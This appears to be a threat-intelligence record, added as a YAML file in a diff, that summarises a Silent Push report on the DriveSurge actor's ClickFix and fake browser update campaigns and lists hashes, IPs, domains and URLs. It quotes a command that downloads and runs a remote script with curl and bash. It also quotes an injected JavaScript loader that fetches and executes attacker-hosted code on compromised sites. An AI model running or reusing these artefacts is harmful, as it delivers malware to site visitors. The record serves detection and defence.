@@ -1,0 +1,115 @@
+title: 'Meet DriveSurge: A New Threat Actor Using ClickFix and Fake Update Drive-By
+  Attacks in Thousands of Compromised Sites'
+description: DriveSurge is a threat actor operating as an Initial Access Broker using
+  a Pay-Per-Install model, compromising thousands of websites to redirect visitors
+  via zTDS to ClickFix and FakeUpdates malware delivery pages. The actor uses sophisticated
+  infrastructure fingerprinting-resistant techniques including obfuscated JavaScript
+  injections, fake browser update pages, and social engineering ClickFix lures.
+attribution: DriveSurge
+malware_families:
+- FakeUpdates
+- ClickFix
+- zTDS
+cves: []
+ttps:
+  processes:
+  - Browser Update.exe
+  - curl
+  - bash
+  command_lines:
+  - cd /tmp && curl -kfsSL "${remoteUrl}" -o ${randomFile} && bash ${randomFile} &&
+    rm -f ${randomFile}
+  powershell: []
+  scripts:
+  - // 1. Check if it already ran and ensure the user is NOT a WordPress administrator
+    if (!window.__performance_optimizer_v6 && (window.__performance_optimizer_v6 =
+    true, !/wordpress_logged_in_/.test(document.cookie))) { var urls = [ "hxxps[://]newtdsone[.]shop",
+    "/jsrepo?rnd=", "hxxps[://]cptoptious[.]com", "/jsrepo?rnd=", "hxxps[://]captioto[.]com"
+    ]; var patterns = [[0, 1], [2, 3], [4, 3]]; function loadPayload(index) { if (index
+    >= patterns.length) return; try { var fullUrl = ""; var sequence = patterns[index];
+    for (var k = 0; k < sequence.length; k++) { fullUrl += atob(urls[sequence[k]]);
+    } var finalUrl = fullUrl + Math.random(); var xhr = new XMLHttpRequest(); xhr.open("GET",
+    finalUrl, false); xhr.send(); if (xhr.status == 200) { var scriptElement = document.createElement("script");
+    scriptElement.text = xhr.responseText; document.head.appendChild(scriptElement);
+    } else { loadPayload(index + 1); } } catch (error) { loadPayload(index + 1); }
+    } loadPayload(0); }
+  - content.ps1
+  - banner-js[.]php
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - Browser Update.exe -> check[.]first-node[.]rocks:443
+  - ClickFix -> 91.92.240[.]127
+  - curl -> 46[.]226[.]166[.]57:80
+  - curl -> 147[.]45[.]42[.]200:80
+  - malware -> 147[.]45[.]42[.]205:8133
+  file_activity:
+  - Browser Update.exe
+  - changelog.txt
+  - script.js
+  - jsrepo
+  - t.js
+  - api_v2.php
+  - config.php
+  - wap.txt
+  - database/blacklist_asn.dat
+  - database/blacklist_ip.dat
+  - database/signature_ref.dat
+  - database/signature_ua.txt
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - 90aecb370dfb1a99a1f7de0a9c6842ab1b664521fddea16b0ec9a91f322646fc
+  - 428bd0b0ac36dfdd223b3953dbe61c0baf227f893310b03e7afe3111462019c6
+  - 29ac78c51bcdfe68c64830bdeb6e41437dd55e2691149741c9b78be03b6c82ea
+  - a84b032b49773c2318b11b1164d1aada69e940229aedbf8185c33fc7dd1d2cdf
+  - 0c62c11e910d7c0d6b6c9800b70e78bfd9220e1f78bd7bb34ae4c3646d05f6e5
+  - 7aa15de93cf85729ddf970e8d7897f69ece3ca29608f73e784a9ba40c9cea18d
+  - 8ecc7108cd679316bf5900e84f19b256dc399902cdede646493f502ac872cc1a
+  - e1ce4e6222396a58d13dddfe64c1dd21f1632bcbe11d1867d44bab4fc646883a
+  ip_addresses:
+  - 91.92.240[.]127
+  - 91[.]92[.]240[.]127
+  - 46[.]226[.]166[.]57
+  - 147[.]45[.]42[.]200
+  - 147[.]45[.]42[.]205
+  domains:
+  - beacontrace[.]bond
+  - jclforwarding[.]com
+  - check[.]first-node[.]rocks
+  - cptoptious[.]com
+  - webgleam[.]info
+  - banerpanel[.]live
+  - testio[.]ecartdev[.]com
+  - maxintora[.]com
+  - ztds[.]info
+  - bseolized[.]com
+  - newtdsone[.]shop
+  - captioto[.]com
+  - ycyfugihih[.]cfd
+  - tempmail[.]so
+  - brightson[.]icu
+  - coverlink[.]icu
+  - datumprobe[.]icu
+  - eraggifts[.]icu
+  - keyview[.]icu
+  - traceglimpse[.]icu
+  - tracekey[.]icu
+  - erans[.]ru
+  - jcdlforwarding[.]com
+  - ecartdev[.]com
+  urls:
+  - hxxps[://]newtdsone[.]shop/jsrepo?rnd=
+  - hxxp://bseolized[.]com
+  - hxxp://46[.]226[.]166[.]57/ce3cbfc887?force=1
+  - hxxp://147[.]45[.]42[.]200/ce3cbfc887?force=1
+  - hxxp://147[.]45[.]42[.]200/66856ca57ed?force=1
+  - hxxp://46[.]226[.]166[.]57/66856ca57ed?force=1
+  - hxxp://147[.]45[.]42[.]200/e97b7f7ccab3a?force=1
+  - hxxp://46[.]226[.]166[.]57/e97b7f7ccab3a?force=1
+authors:
+- Silent Push
+reference: https://www.silentpush.com/blog/drivesurge
+date_of_publication: May 30, 2026
+file_creation_date: June 01, 2026
